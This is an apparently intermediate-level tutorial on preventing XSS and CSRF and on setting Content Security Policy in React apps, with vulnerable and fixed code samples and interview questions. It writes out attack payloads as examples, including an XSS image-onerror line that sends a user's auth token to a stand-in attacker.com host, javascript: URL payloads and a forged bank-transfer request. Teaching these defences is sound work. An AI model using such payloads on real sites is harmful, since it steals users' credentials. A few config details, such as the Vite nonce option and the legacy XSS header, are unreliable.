# XSS, CSRF & CSP: Frontend Security Deep Dive

**Level:** Intermediate-Advanced | **Time:** 50 mins | **Interview:** 🔥 Critical

---

## Overview

Frontend security isn't about encryption — it's about preventing attackers from running arbitrary code in your app. The three biggest threats: XSS (Cross-Site Scripting — inject malicious code), CSRF (Cross-Site Request Forgery — trick user into unwanted action), CSP (Content Security Policy — declare which code can run). Understanding these is critical for any production React app.

**Why this matters:**
- XSS is #1 web vulnerability (OWASP Top 10)
- One XSS hole = attacker reads user tokens, alters UI, steals data
- Legal: if your XSS causes data breach, you're liable
- Interview question: "How would you prevent XSS in a user comment system?"

---

## 1. XSS (Cross-Site Scripting)

Attacker injects malicious JavaScript that runs in the user's browser.

### Attack Vector 1: DOM Injection (Most Common)

```javascript
// ❌ VULNERABLE: User input directly into DOM
function CommentSection({ userId }) {
  const [comments, setComments] = useState([]);
  
  const handleAddComment = (text) => {
    setComments([...comments, { user: userId, text }]);
  };
  
  return (
    <div>
      {comments.map((c) => (
        <div key={c.text}>
          <strong>{c.user}</strong>
          {/* VULNERABLE: If text = "<img src=x onerror='fetch(ATTACKER)'>" */}
          <div dangerouslySetInnerHTML={{ __html: c.text }} />
        </div>
      ))}
    </div>
  );
}

// Attack payload:
const maliciousComment = `<img src=x onerror="fetch('https://attacker.com/steal?token=' + localStorage.getItem('authToken'))" />`;
// User sees comment, browser loads broken img → onerror fires → token stolen
```

**How React protects (by default):**
```javascript
// ✅ SAFE: React escapes by default
function CommentSection({ comments }) {
  return (
    <div>
      {comments.map((c) => (
        <div key={c.text}>
          <strong>{c.user}</strong>
          {/* React escapes <, >, &, " as &lt; &gt; &amp; &quot; */}
          <p>{c.text}</p>
        </div>
      ))}
    </div>
  );
}

// Even if text = "<img src=x onerror='...'>"
// It renders as literal string: "&lt;img src=x onerror='...'&gt;"
// Browser doesn't execute it
```

**The danger of `dangerouslySetInnerHTML`:**
```javascript
// ❌ NEVER DO THIS WITH USER INPUT
<div dangerouslySetInnerHTML={{ __html: userComment }} />

// ✅ ONLY IF SANITIZED
import DOMPurify from 'dompurify';

const safeHtml = DOMPurify.sanitize(userComment);
<div dangerouslySetInnerHTML={{ __html: safeHtml }} />

// ✅ EVEN BETTER: Use libraries like react-markdown (safe by default)
import ReactMarkdown from 'react-markdown';

<ReactMarkdown>{userComment}</ReactMarkdown>
```

---

### Attack Vector 2: JavaScript URL

```javascript
// ❌ VULNERABLE: User input in href
<a href={userProvidedUrl}>Click here</a>
// Attack: href="javascript:alert('XSS')" or "javascript:fetch(...)"

// ✅ SAFE: Validate URL scheme
const isValidUrl = (url) => {
  try {
    const parsed = new URL(url);
    return ['http:', 'https:', 'mailto:'].includes(parsed.protocol);
  } catch {
    return false;
  }
};

<a href={isValidUrl(userUrl) ? userUrl : '#'}>Click</a>

// ✅ ALSO SAFE: React Link if internal
import { Link } from 'react-router-dom';

<Link to={userRoute}>Internal link</Link> {/* Already validated by router */}
```

---

### Attack Vector 3: Event Handler Injection

```javascript
// ❌ VULNERABLE: User input in event attributes
<div
  onMouseEnter={() => {
    userProvidedFunction(); // What if this is malicious?
  }}
/>

// ❌ VULNERABLE: eval() with user input (never do this)
const result = eval(userProvidedCode); // NEVER

// ✅ SAFE: Never execute user code directly
// Validate, whitelist, sandbox, or use safer alternatives
```

---

### Attack Vector 4: Attribute Injection

```javascript
// ❌ VULNERABLE: User input in attributes
<img src={userImage} alt={userAlt} title={userTitle} />
// Attack: title='"><script>alert(1)</script><img src="'
// Results in: <img ... title=""><script>alert(1)</script><img src="">

// ✅ SAFE: React escapes attributes automatically
// React converts: "><script> → &quot;&gt;&lt;script&gt;
<img src={userImage} alt={userAlt} title={userTitle} />

// ✅ BUT: Verify src is valid
<img src={isValidImageUrl(userImage) ? userImage : '/fallback.png'} />
```

---

## 2. CSRF (Cross-Site Request Forgery)

Attacker tricks user into making unwanted requests. Difference from XSS: attacker doesn't inject code — they trick the browser into making requests with the user's credentials.

### Attack Scenario

```
1. User logs into bank.com, gets cookie (bank session token)
2. User visits attacker.com (still logged into bank)
3. attacker.com contains: <img src="https://bank.com/transfer?to=attacker&amount=1000" />
4. Browser sends request WITH bank's session cookie (same-site)
5. Bank sees valid cookie, transfers money (thinks user clicked it)
```

### Defense 1: CSRF Tokens

```javascript
// Backend generates unique token per request
// ✅ SAFE: Include token in forms
function TransferForm() {
  const [csrfToken, setCsrfToken] = useState('');
  
  useEffect(() => {
    // Fetch token from backend
    fetch('/api/csrf-token')
      .then(r => r.json())
      .then(data => setCsrfToken(data.token));
  }, []);
  
  const handleSubmit = async (e) => {
    e.preventDefault();
    const res = await fetch('/api/transfer', {
      method: 'POST',
      headers: {
        'X-CSRF-Token': csrfToken, // Include in header (attacker can't read)
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ amount: 100, to: 'alice' })
    });
  };
  
  return (
    <form onSubmit={handleSubmit}>
      <input type="hidden" name="csrf" value={csrfToken} />
      <input name="amount" type="number" />
      <button type="submit">Transfer</button>
    </form>
  );
}
```

---

### Defense 2: SameSite Cookies

```javascript
// Backend sets cookie with SameSite=Strict
// Set-Cookie: sessionId=xyz; SameSite=Strict; HttpOnly; Secure

// SameSite values:
// Strict: Cookie sent ONLY in same-site requests (safest, breaks some features)
// Lax: Cookie sent in top-level navigation (default in modern browsers)
// None: Cookie sent always (only with Secure flag, requires HTTPS)

// ✅ SAFE: Most apps use Lax
// User visits attacker.com
// Browser makes request to bank.com → Lax cookie NOT sent
// Bank doesn't see session → no CSRF

// ❌ VULNERABLE: SameSite=None (old code)
// Set-Cookie: sessionId=xyz; SameSite=None; Secure;
// Attacker's site can trigger requests WITH cookie
```

---

### Defense 3: Origin & Referer Headers

```javascript
// Backend validates Origin header
// POST /api/transfer
// Origin: https://attacker.com (❌ not your domain, reject)
// Origin: https://bank.com (✅ valid, allow)

// ✅ Server-side validation
app.post('/api/transfer', (req, res) => {
  const origin = req.headers.origin;
  const allowedOrigins = ['https://bank.com'];
  
  if (!allowedOrigins.includes(origin)) {
    return res.status(403).json({ error: 'CSRF detected' });
  }
  
  // Process transfer
});
```

---

## 3. CSP (Content Security Policy)

CSP tells the browser: "Only execute code from these sources." Stops XSS by restricting where scripts can come from.

### Policy Declaration

```html
<!-- ❌ UNSAFE: Allow all scripts (default if no CSP) -->
<!-- <script>alert('XSS')</script> can run from anywhere -->

<!-- ✅ SAFE: CSP in meta tag -->
<meta
  http-equiv="Content-Security-Policy"
  content="default-src 'self'; script-src 'self' https://cdn.jsdelivr.net"
/>

<!-- ✅ BETTER: CSP via HTTP header (server-side, can't be bypassed) -->
<!-- Response header: Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.jsdelivr.net -->
```

### CSP Directives

```javascript
// Common directives:
const CSP = {
  // default-src: Fallback for all sources
  "default-src": ["'self'"], // Only same origin
  
  // script-src: Where scripts can come from
  "script-src": [
    "'self'", // Same origin
    "https://cdn.jsdelivr.net", // Specific CDN
    "'nonce-abc123'" // Inline script with matching nonce
  ],
  
  // style-src: Where stylesheets come from
  "style-src": ["'self'", "'unsafe-inline'"], // Dangerous: allows inline styles
  
  // img-src: Where images come from
  "img-src": ["'self'", "https:"], // Any HTTPS image
  
  // connect-src: Allowed fetch/XHR targets
  "connect-src": ["'self'", "https://api.example.com"],
  
  // frame-ancestors: Which sites can embed this page in iframe
  "frame-ancestors": ["'none'"], // Can't be embedded
  
  // report-uri: Send violations to this endpoint
  "report-uri": ["https://example.com/csp-report"]
};
```

---

### CSP + React: Nonces

```javascript
// Problem: React uses inline scripts, CSP blocks them
// Solution: Use nonces (one-time tokens)

// 1. Server generates random nonce per request
const nonce = crypto.randomBytes(16).toString('base64');

// 2. Include in CSP header
res.set('Content-Security-Policy', `script-src 'nonce-${nonce}'`);

// 3. Send nonce to React app
const html = `
  <!DOCTYPE html>
  <html>
    <head>
      <meta http-equiv="Content-Security-Policy" content="script-src 'nonce-${nonce}'">
    </head>
    <body>
      <div id="root"></div>
      <script nonce="${nonce}" src="/bundle.js"></script>
    </body>
  </html>
`;

// React: Use nonce in Vite/Webpack config
// vite.config.ts
export default defineConfig({
  server: {
    middlewareMode: true
  },
  html: {
    cspNonce: true // Auto-injects nonce from response header
  }
});
```

---

### Real Production CSP Policy

```javascript
// Netflix-style CSP (strict, no unsafe-inline)
const csp = [
  "default-src 'none'",
  "script-src 'self' https://cdn.example.com 'nonce-abc123'",
  "style-src 'self' 'nonce-abc123'", // No unsafe-inline
  "img-src 'self' https: data:",
  "font-src 'self' https://fonts.gstatic.com",
  "connect-src 'self' https://api.example.com",
  "frame-ancestors 'none'",
  "form-action 'self'", // Forms submit only to same origin
  "base-uri 'self'",
  "upgrade-insecure-requests", // Force HTTPS
  "block-all-mixed-content" // No HTTP when HTTPS
].join('; ');

// Express middleware
app.use((req, res, next) => {
  res.set('Content-Security-Policy', csp);
  res.set('X-Content-Type-Options', 'nosniff'); // Don't guess MIME type
  res.set('X-Frame-Options', 'DENY'); // No iframes
  res.set('X-XSS-Protection', '1; mode=block'); // Legacy XSS filter
  next();
});
```

---

## Real Production Example: Secure Comment System

```javascript
import DOMPurify from 'dompurify';
import { useMutation, useQuery } from '@tanstack/react-query';

function SecureComments({ postId }) {
  const { data: comments } = useQuery({
    queryKey: ['comments', postId],
    queryFn: () => fetch(`/api/posts/${postId}/comments`).then(r => r.json())
  });

  const addCommentMutation = useMutation({
    mutationFn: async (text) => {
      // 1. Validate on client (basic)
      if (text.length > 5000) throw new Error('Comment too long');
      
      // 2. Include CSRF token
      const csrfToken = document.querySelector('meta[name="csrf-token"]').content;
      
      // 3. Send to server
      const res = await fetch(`/api/posts/${postId}/comments`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-CSRF-Token': csrfToken
        },
        body: JSON.stringify({ text })
      });
      return res.json();
    }
  });

  return (
    <div>
      {comments?.map((comment) => (
        <div key={comment.id} style={{ marginBottom: '1rem', padding: '1rem', border: '1px solid #ccc' }}>
          {/* 3. Render safely (React escapes by default) */}
          <p><strong>{comment.author}</strong></p>
          <p>{comment.text}</p> {/* Safe: text is escaped */}
          
          {/* ✅ If comment.html needs rendering (rare): */}
          {comment.hasMarkdown && (
            <div>
              {/* Sanitize before rendering */}
              <div dangerouslySetInnerHTML={{
                __html: DOMPurify.sanitize(comment.markdownHtml)
              }} />
            </div>
          )}
        </div>
      ))}
      
      <form onSubmit={(e) => {
        e.preventDefault();
        const formData = new FormData(e.target);
        addCommentMutation.mutate(formData.get('comment'));
      }}>
        <textarea
          name="comment"
          maxLength="5000"
          placeholder="Add a comment..."
          required
        />
        <button type="submit" disabled={addCommentMutation.isPending}>
          Post
        </button>
      </form>
    </div>
  );
}
```

---

## Security Checklist

- [ ] Never use `dangerouslySetInnerHTML` with user input (or sanitize with DOMPurify)
- [ ] Escape user input by default (React does this)
- [ ] Validate URLs before using in href (no javascript:)
- [ ] Implement CSRF tokens or SameSite cookies
- [ ] Set CSP header (not meta tag) with `script-src 'self'`
- [ ] Use nonces for inline scripts
- [ ] Never eval() user code
- [ ] Sanitize user input on backend (defense in depth)
- [ ] Use HTTPS only (Secure + HttpOnly cookies)
- [ ] Set X-Content-Type-Options: nosniff
- [ ] Set X-Frame-Options: DENY (prevent clickjacking)
- [ ] Test with OWASP ZAP or Burp Suite

---

## Interview Prep Questions

1. **"How would you prevent XSS in a comment system?"**
   - Answer: React escapes by default. For rich HTML: sanitize with DOMPurify. For markdown: use react-markdown. Always validate on backend too.

2. **"What's the difference between XSS and CSRF?"**
   - Answer: XSS injects malicious code. CSRF tricks user into making requests. XSS requires user to see injected code. CSRF happens silently.

3. **"Should we use SameSite=Strict or Lax?"**
   - Answer: Lax by default (works with navigation). Strict if no legitimate same-site POST requests. None only if you need cross-origin cookies (rare).

4. **"What happens if CSP blocks a script?"**
   - Answer: Browser blocks it + logs violation. If report-uri set, sends violation report. User sees broken feature, not error.

5. **"Can dangerouslySetInnerHTML ever be safe?"**
   - Answer: Only if content is trusted (server-generated, not user input). If user input: sanitize with DOMPurify first.

---

## See Also

- OWASP Top 10: Web Security Risks
- MDN: Content Security Policy
- DOMPurify: XSS sanitizer library
- Snyk: Free vulnerability scanning
- OWASP ZAP: Free security testing tool
